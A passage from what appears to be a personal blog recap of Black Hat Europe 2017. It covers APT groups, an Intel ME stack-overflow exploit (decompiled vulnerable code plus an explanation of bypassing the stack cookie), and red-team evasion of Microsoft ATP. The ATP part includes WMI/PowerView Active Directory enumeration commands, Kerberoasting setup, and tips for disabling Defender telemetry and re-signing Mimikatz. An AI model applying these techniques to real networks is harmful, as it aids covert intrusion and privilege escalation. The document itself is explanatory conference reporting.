22a279c5685d7c3e24c04580204a8a932b2909a77a549bdd7bcf7ead285efde9</p><p>They used Ghostscript vulnerability (kind of macro attack).</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/apt6.png data-srcset="/lib/images/articles/bheu2017/apt6.png, /lib/images/articles/bheu2017/apt6.png 1.5x, /lib/images/articles/bheu2017/apt6.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/apt6.png title=/lib/images/articles/bheu2017/apt6.png></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/apt7.png data-srcset="/lib/images/articles/bheu2017/apt7.png, /lib/images/articles/bheu2017/apt7.png 1.5x, /lib/images/articles/bheu2017/apt7.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/apt7.png title=/lib/images/articles/bheu2017/apt7.png></p><p>Personal point of view, malware developed by those groups are not “complicated”. They’re not (or few) obfuscated, the real exploit is the recon step.</p><p>They can use cryptocurrencies to buy C&C server, to be more difficult to find. Bitcoin obtained via stole or ransomed action.</p><p>According to McAfee, Lazarus moved to mobile platforms (2). Unit 42 from Palo Alto discovered a cluster of malware, which targets Samsung devices and Korean Languages speakers (3).</p><p>Andariel acts during company activity, to be quieter during the attack.</p><p><strong>From a personal point of view</strong>, it is pretty cool to see how this kind of attack is defeated, and how those cybercriminals planned their actions. I’m just a bit surprised by malware developed by those groups, they are not encrypted or very hard to reverse.</p><h4 id=sources-documents-2>Sources documents</h4><ol><li>Chi-En Shen, Min-Chang Jang & Kyoung-Ju Kwak, <em>Black hat presentation</em>, Wednesday, December 6, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State%20Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State%20Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf</a></li><li>Christian Beek, <em>Lazarus Cybercrime Group Moves to Mobile Platform</em>, November 20, 2017. <a href=https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-cybercrime-group-moves-to-mobile/ target=_blank rel="noopener noreffer">https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-cybercrime-group-moves-to-mobile/</a></li><li>Anthony Kasza, Juan Cortes, and Micah Yates, <em>Operation Blockbuster Goes Mobile</em>, November 20, 2017. <a href=https://researchcenter.paloaltonetworks.com/2017/11/unit42-operation-blockbuster-goes-mobile/ target=_blank rel="noopener noreffer">https://researchcenter.paloaltonetworks.com/2017/11/unit42-operation-blockbuster-goes-mobile/</a></li><li>TechNet Archive, <em>Using a Host-Guest communication channel in Windows Virtual PC</em>, October 13, 2009. <a href=https://blogs.technet.microsoft.com/windows_vpc/2009/10/13/using-a-host-guest-communication-channel-in-windows-virtual-pc/ target=_blank rel="noopener noreffer">https://blogs.technet.microsoft.com/windows_vpc/2009/10/13/using-a-host-guest-communication-channel-in-windows-virtual-pc/</a></li></ol><h3 id=how-to-hack-a-turned-off-computer-or-running-unsigned-code-in-intel-management-engine>How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine</h3><blockquote><p>Mark Ermolov & Maxim Goryachy from Positive Technologies</p></blockquote><p>They revealed CVE-2017-5705,6,7 (3). As <em>Mark Ermolov</em> <a href=https://twitter.com/_markel___/status/938166256322129921 target=_blank rel="noopener noreffer">tweet</a> says, their vulnerability depends on MFS.</p><p>There are few vulnerabilities in the ME, but only 1 allows execution of arbitrary code on ME! But, now, there is two.</p><p>Potentials attack vectors:</p><ul><li><strong>Local communication interface (HECI)</strong>: Separated PCI device, it exchanges messages between the main system and the ME.</li><li><strong>Network (vPro only)</strong>: ATM is a large module, so a lot of code. But only available in business systems.</li><li><strong>IPMI/MCTP</strong>: ??</li><li><strong>Host memory (UMA)</strong>: AES encryption with integrity checking.</li><li><strong>Firmware SPI layout</strong>: Needs intel private key to exploit a bug in parsing procedure of signed data. Moreover, the firmware is not vulnerable to “evil SPI flash” attack in general.</li><li><strong>Internal file system</strong>: It refers to the previous briefing by <em>imitry SKLYAROV</em></li></ul><p>The architecture of the ME shows 2 issues:</p><ul><li>A process can create another process which is more privileged than itself.</li><li>Access to internal devices completely breaks the security model.</li></ul><p>In high privileged modules, we meet <strong>BUP</strong>, as we saw with first ME briefing.</p><p><strong>BUP</strong> can create a child process, and of course, choose its privilege. Also, this module exists on all platforms, has access to security sensitive hardware, can bypass MFS protection, one of the largest modules (more code = more attack vector) and interacts with the host via HECI.</p><p>In the processing of reverse engineering, they find a buffer overflow vulnerability in the <strong>Trace hub initialization</strong>. Here is the function code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=kt>void</span> <span class=kr>__cdecl</span> <span class=nf>bup_init_trace_hub</span> <span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>err</span><span class=p>;</span> <span class=c1>// eax 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>eax</span> <span class=kt>signed</span> <span class=kt>int</span> <span class=n>npk_reg_idx</span><span class=p>;</span> <span class=c1>// ebx 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>ebx</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>bytes_read</span><span class=p>;</span> <span class=c1>// [esp+0h] [ebp-350 h]
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>file_size</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-34 Ch] 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>int</span> <span class=n>si_features</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span> <span class=c1>// [esp+8h] [ebp-348 h] 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>int</span> <span class=n>ct_data</span><span class=p>[</span><span class=mi>202</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-334 h] 808 bytes 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>int</span> <span class=n>cookie</span><span class=p>;</span> <span class=c1>// [esp+344h] [ebp - Ch] 
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl>        <span class=n>cookie</span> <span class=o>=</span> <span class=n>gRmlbCookie</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>memset</span> <span class=p>(</span><span class=n>si_features</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x14u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>bytes_read</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>file_size</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>getDW_sel</span> <span class=p>(</span><span class=mh>0xBF</span><span class=p>,</span><span class=mh>0xE0u</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x1000000</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>bup_get_si_features</span> <span class=p>(</span><span class=n>si_features</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>bup_dfs_get_file_size</span> <span class=p>(</span><span class=s>&#34;/home/bup/ct&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>file_size</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>file_size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                    <span class=n>LOBYTE</span> <span class=p>(</span><span class=n>err</span><span class=p>)</span> <span class=o>=</span> <span class=n>bup_dfs_read_file</span> <span class=p>(</span><span class=s>&#34;/home/bup/ct&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>ct_data</span><span class=p>,</span> <span class=n>file_size</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>bytes_read</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>npk_reg_idx</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                  
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                      <span class=k>while</span> <span class=p>(</span><span class=n>npk_reg_idx</span> <span class=o>&lt;</span> <span class=n>HIWORD</span> <span class=p>(</span><span class=n>ct_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>                        <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=p>(</span><span class=n>HIBYTE</span> <span class=p>(</span><span class=n>ct_data</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>npk_reg_idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>])</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>         
</span></span><span class=line><span class=cl>                                <span class=n>putDW_sel</span> <span class=p>(</span><span class=mh>0xB7</span><span class=p>,</span> <span class=n>ct_data</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>npk_reg_idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFF</span><span class=p>,</span> <span class=n>ct_data</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>npk_reg_idx</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=p>(</span><span class=n>HIBYTE</span> <span class=p>(</span><span class=n>ct_data</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>npk_reg_idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>])</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                <span class=n>putDW_sel</span> <span class=p>(</span><span class=mh>0xBF</span><span class=p>,</span> <span class=n>ct_data</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>npk_reg_idx</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFF</span><span class=p>,</span> <span class=n>ct_data</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>npk_reg_idx</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]);</span>  
</span></span><span class=line><span class=cl>                            <span class=o>++</span><span class=n>npk_reg_idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                      <span class=n>bup_switch_tracer</span> <span class=p>(</span><span class=mh>0xB7</span><span class=p>,</span> <span class=mh>0xBF</span> <span class=n>u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>gRmlbCookie</span> <span class=o>!=</span> <span class=n>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys_fault</span> <span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>So the vulnerability is here, but there is a stack protection against buffer overflow, the <strong>stack cookie</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=kt>void</span> <span class=kr>__cdecl</span> <span class=nf>bup_init_trace_hub</span> <span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>ct_data</span><span class=p>[</span><span class=mi>202</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-334 h] 808 bytes 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>int</span> <span class=n>cookie</span><span class=p>;</span> <span class=c1>// [esp+344h] [ebp - Ch] 
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl>        <span class=n>cookie</span> <span class=o>=</span> <span class=n>gRmlbCookie</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>getDW_sel</span> <span class=p>(</span><span class=mh>0xBF</span><span class=p>,</span><span class=mh>0xE0u</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x1000000</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>bup_get_si_features</span> <span class=p>(</span><span class=n>si_features</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>bup_dfs_get_file_size</span> <span class=p>(</span><span class=s>&#34;/home/bup/ct&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>file_size</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>file_size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                    <span class=n>LOBYTE</span> <span class=p>(</span><span class=n>err</span><span class=p>)</span> <span class=o>=</span> <span class=n>bup_dfs_read_file</span> <span class=p>(</span><span class=s>&#34;/home/bup/ct&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>ct_data</span><span class=p>,</span> <span class=n>file_size</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>bytes_read</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>gRmlbCookie</span> <span class=o>!=</span> <span class=n>cookie</span><span class=p>)</span> <span class=c1>// Stack protection
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>sys_fault</span> <span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The <strong>/home/bup/ct</strong> is an unsigned file from <strong>fitc.cfg</strong> (cf. First presentation):</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/me5.png data-srcset="/lib/images/articles/bheu2017/me5.png, /lib/images/articles/bheu2017/me5.png 1.5x, /lib/images/articles/bheu2017/me5.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/me5.png title=/lib/images/articles/bheu2017/me5.png></p><p>The <em>stack cookie</em> implements:</p><ul><li>Each process has unique value for stack cookie</li><li>32 bits value is obtained from hardware random number generator</li><li>Stored is nonvolatile process memory</li><li>If cookie changed, the process exited</li></ul><p>To bypass the protection they decided to intercept the execution flow and exploit the buffer overflow before the cookie checking.</p><p>To do that, in the code above, we can see the <strong>bup_dfs_read_file</strong> that indirectly call a <strong>memcpy</strong> function. Then, they have the destination address of the structure they named <strong>Tread Local Storage</strong> (TLS). In <em>BUP</em> read/write functions obtains and records data via a shared memory mechanism. Because <em>BUP</em> interacts with <em>MFS</em> though another module <strong>file system driver</strong>. The TLS region can be overwritten by a read function, and then bypass the buffer overflow protection.</p><table><thead><tr><th>Code flow</th></tr></thead><tbody><tr><td>bup_init_trace_hub</td></tr><tr><td>bup_dfs_read_file</td></tr><tr><td>bup_read_mfs_file</td></tr><tr><td>sys_write_shared_mem</td></tr></tbody></table><p>The TLS structure looks to:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/me3.png data-srcset="/lib/images/articles/bheu2017/me3.png, /lib/images/articles/bheu2017/me3.png 1.5x, /lib/images/articles/bheu2017/me3.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/me3.png title=/lib/images/articles/bheu2017/me3.png></p><p>And now, the serious problem architecture is that the TLS structure is stored at the bottom of the stack. Then you can erase the <strong>gs:[0]</strong>, the self-pointer and generate a new structure, it allows an attacker to write arbitrary data.</p><p>Here is a diagram of the stack (from presentation (1)):</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/me1.png data-srcset="/lib/images/articles/bheu2017/me1.png, /lib/images/articles/bheu2017/me1.png 1.5x, /lib/images/articles/bheu2017/me1.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/me1.png title=/lib/images/articles/bheu2017/me1.png></p><p>Now, <em>Mark Ermolov & Maxim Goryachy</em> tells us how to get an arbitrary write primitive. They “just” rewrite (there is no ASLR) the return address of memcpy to hijack the program control flow.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/bheu2017/me2.png data-srcset="/lib/images/articles/bheu2017/me2.png, /lib/images/articles/bheu2017/me2.png 1.5x, /lib/images/articles/bheu2017/me2.png 2x" data-sizes=auto alt=/lib/images/articles/bheu2017/me2.png title=/lib/images/articles/bheu2017/me2.png></p><p>But, <strong>Stack is nonexecutable</strong>, then they create their own module and integrate it into the firmware. This module used ROP gadgets to:</p><ul><li>Load the module into memory</li><li>Create new process with highest privileges</li></ul><p>Is remote exploitation possible?</p><p>Yes, if:</p><ul><li>AMT is enabled and attacker known password (or use CVE-2017-5689)</li><li>BIOS has “Flash rewrite enable” option</li><li>BIOS password is blank or known</li></ul><p>Updates systems are not out of danger because the firmware downgrade to a vulnerable version is possible, but it needs a physical access to the target.</p><p>TLS is still at the same place, even after the update.</p><p><strong>From a personal point of view</strong>, this presentation was just awesome, it’s the presentation that I enjoyed the most. I think in my final year at school, I will take the Intel ME as a research paper.</p><p>During Demo Time, they played a video showing a big “GAME OVER” blinking on the screen at boot (not at windows boot, at computer boot, so we could see the message before the loading screen of Windows).</p><h4 id=sources-documents-3>Sources documents</h4><ol><li>Mark Ermolov & Maxim Goryachy, <em>Black hat presentation</em>, Wednesday, December 6, 2017. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine.pdf</a></li><li>Mark Ermolov & Maxim Goryachy, <em>[Paper] How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine</em>. <a href=https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf target=_blank rel="noopener noreffer">https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf</a></li><li>CVE-2017-5705, <a href=https://nvd.nist.gov/vuln/detail/CVE-2017-5705 target=_blank rel="noopener noreffer">https://nvd.nist.gov/vuln/detail/CVE-2017-5705</a></li><li>CVE-2017-5706, <a href=https://nvd.nist.gov/vuln/detail/CVE-2017-5706 target=_blank rel="noopener noreffer">https://nvd.nist.gov/vuln/detail/CVE-2017-5706</a></li><li>CVE-2017-5707, <a href=https://nvd.nist.gov/vuln/detail/CVE-2017-5707 target=_blank rel="noopener noreffer">https://nvd.nist.gov/vuln/detail/CVE-2017-5707</a></li><li>CVE-2017-5689, <a href=https://nvd.nist.gov/vuln/detail/CVE-2017-5689 target=_blank rel="noopener noreffer">https://nvd.nist.gov/vuln/detail/CVE-2017-5689</a></li></ol><h3 id=goodies-hunting-part-1>Goodies hunting part 1</h3><p>At the end of the first day, with <a href=https://twitter.com/razaborg target=_blank rel="noopener noreffer">@razaborg</a> we tried some challenge offered by companies in the business hall, and getting some goodies!</p><p>The challenge tested (by a company whose I forgot the name, really sorry :X), was an IP camera inside a box with digital code protection. Numbers were hidden on the presentation stand, we find 3 on the 6, not enough, unfortunately…</p><h2 id=day-2>Day 2</h2><h3 id=red-team-techniques-for-evading-bypassing-and-disabling-ms-advanced-threat-protection-and-advanced-threat-analytics>Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics</h3><blockquote><p>Chris THOMPSON (@retBandit) from IBM X-Forced Red</p></blockquote><p>Step in a red team mission:</p><ul><li>External recon</li><li>Gain a Foothold</li><li>Host recon</li><li>Internal recon</li><li>Lateral movement</li><li>Dominance</li></ul><p>Obfuscated PowerShell script triggered Advanced Threat Protection (ATP). ATP includes machine learning and AMSI.</p><blockquote><p>Defender ATP =/= Defender AV</p></blockquote><p>Misc techniques to gain the initial foothold: * Obfuscated JScript/VBScript THAT DON’T USE <strong>KERNEL32 API</strong>. * Using signed exec’s to load a Cobalt stageless payload. * Some executables created with Veil (Go) and Shellter.</p><p><strong>Not detected</strong>: WMI</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>wmic</span> <span class=k>process</span> <span class=n>list</span> <span class=n>brief</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=nb>group </span><span class=n>list</span> <span class=n>brief</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=n>computersystem</span> <span class=n>list</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=k>process</span> <span class=n>list</span> <span class=p>/</span><span class=n>format</span><span class=err>:</span><span class=n>list</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=n>ntdomain</span> <span class=n>list</span> <span class=p>/</span><span class=n>format</span><span class=err>:</span><span class=n>list</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=n>useraccount</span> <span class=n>list</span> <span class=p>/</span><span class=n>format</span><span class=err>:</span><span class=n>list</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=nb>group </span><span class=n>list</span> <span class=p>/</span><span class=n>format</span><span class=err>:</span><span class=n>list</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=n>sysaccount</span> <span class=n>list</span> <span class=p>/</span><span class=n>format</span><span class=err>:</span><span class=n>list</span>
</span></span><span class=line><span class=cl><span class=n>wmic</span> <span class=p>/</span><span class=n>Namespace</span><span class=err>:</span><span class=p>\\</span><span class=n>root</span><span class=p>\</span><span class=n>SecurityCenter2</span> <span class=n>Path</span> <span class=n>AntiVirusProduct</span> <span class=n>Get</span> <span class=p>*</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_UserAccount</span> <span class=n>-Filter</span> <span class=s2>&#34;LocalAccount=&#39;True&#39;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Use MSF modules with local WinAPI calls, such as <strong>file_from_raw_ntfs.rb</strong>, don’t use <strong>local_admin_search_enum.rb</strong>.</p><p>CobaltStrike has a number of modules that are API-only.</p><p><strong>Avoid AMSI</strong></p><p>Userland Persistence and AMSI Bypass via Component Object Model Hijacking.</p><p>ATP can’t be stopped or uninstalled, even with a SYSTEM account, because of Protected Process Light.</p><p>But it’s possible to block ATP communications via DiagTrack Service. Hijack DLL to remove PPL protection? (personal note: not sure)</p><p>Mimikatz driver is registered as malicious now, but you change the service name and re-sign it.</p><p>It’s possible to block all Windows Defender/ATP Comms via Firewall (1 page 42)</p><p><strong>Not detected</strong>: Using LDAP/Powerview to gather computers/users.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-NetComputer</span> <span class=n>-verbose</span> <span class=n>-domain</span> <span class=n>prod</span><span class=p>.</span><span class=n>local</span>
</span></span><span class=line><span class=cl><span class=nb>Get-NetGroupMember</span> <span class=n>-GroupName</span> <span class=s2>&#34;Enterprise Admins&#34;</span> <span class=n>-Domain</span> <span class=n>dev</span><span class=p>.</span><span class=n>local</span> <span class=n>-verbose</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Not detected</strong>: Enumeration via WMI Local Name Space</p><p>Domain User Accounts:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_UserAccount</span> <span class=n>-Filter</span> <span class=s2>&#34;Domain=&#39;dev&#39; AND Disabled=&#39;False&#39;&#34;</span> <span class=p>|</span> <span class=nb>Select </span><span class=n>Name</span><span class=p>,</span> <span class=n>Domain</span><span class=p>,</span> <span class=n>Status</span><span class=p>,</span> <span class=n>LocalAccount</span><span class=p>,</span> <span class=n>AccountType</span><span class=p>,</span> <span class=n>Lockout</span><span class=p>,</span> <span class=n>PasswordRequired</span><span class=p>,</span> <span class=n>PasswordChangeable</span><span class=p>,</span> <span class=n>Description</span><span class=p>,</span> <span class=n>SID</span>
</span></span></code></pre></td></tr></table></div></div><p>Domain Groups:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-ComInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_Group</span> <span class=n>-Filter</span> <span class=s2>&#34;Domain = &#39;dev&#39; AND Name like &#39;%Admin%&#39;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Domain Group User Memberships:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_Group</span> <span class=n>-Filter</span> <span class=s2>&#34;Domain = &#39;dev&#39; AND Name=&#39;Enterprise Admins&#39;&#34;</span> <span class=p>|</span> <span class=nb>Get-CimAssociatedInstance</span> <span class=p>-</span> <span class=n>Association</span> <span class=n>Win32_GroupUser</span>    
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_Group</span> <span class=n>-Filter</span> <span class=s2>&#34;Domain = &#39;dev&#39; AND Name=&#39;Microsoft Advanced Threat Analytics Administrator&#39;&#34;</span> <span class=p>|</span> <span class=nb>Get-CimAssociatedInstance</span> <span class=p>-</span> <span class=n>Association</span> <span class=n>Win32_GroupUser</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>Not detected</strong>: SPN Enumeration & Kerberoasting</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-NetComputer</span> <span class=n>-SPN</span> <span class=n>mssql</span><span class=p>*</span>
